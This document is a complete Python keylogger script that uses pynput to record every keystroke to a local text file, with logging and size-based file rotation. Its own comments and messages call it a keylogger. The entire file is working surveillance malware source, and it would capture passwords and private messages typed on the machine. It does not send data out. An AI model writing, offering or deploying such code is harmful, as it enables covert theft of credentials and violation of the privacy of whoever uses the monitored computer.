from pynput import keyboard
import logging
import os
import time

# Set up logging configuration
logging.basicConfig(filename='Keyfile.log',
                    level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Log a startup message
logging.info('Keylogger started.')

# Function to handle key presses
def keyPressed(key):
    # Print the key to the console for debugging
    print("Key pressed: {str(key)}")

    # Create or append to the log file
    with open("Keyfile.txt", 'a') as logKey:
        try:
            # Log the key character if available
            char = key.char
            if char:
                logKey.write(f"{char}")
                logging.info(f"Logged character: {char}")
            else:
                # Handle special keys
                logKey.write(f"[{key}]")
                logging.info(f"Logged special key: [{key}]")
        except AttributeError:
            # Handle special keys when char attribute is not present
            logKey.write(f"[{key}]")
            logging.info(f"Logged special key (exception): [{key}]")

    # Additional log file management (e.g., size check and rotation)
    manage_log_file()

# Function to manage log file size and rotate if necessary
def manage_log_file():
    log_file_size = os.path.getsize('Keyfile.txt')
    max_file_size = 5 * 1024 * 1024  # 5 MB limit for the example
    if log_file_size > max_file_size:
        timestamp = time.strftime("%Y%m%d%H%M%S")
        new_filename = f"Keyfile_{timestamp}.txt"
        os.rename('Keyfile.txt', new_filename)
        logging.info(f"Log file rotated: {new_filename}")

# Function to set up and start the listener
def setup_listener():
    logging.info('Setting up key listener...')
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    logging.info('Listener started.')
    listener.join()

# Entry point of the program
if __name__ == "__main__":
    try:
        setup_listener()
    except KeyboardInterrupt:
        logging.info('Keylogger stopped by user.')
    except Exception as e:
        logging.error(f"An error occurred: {e}")
    finally:
        logging.info('Keylogger exiting.')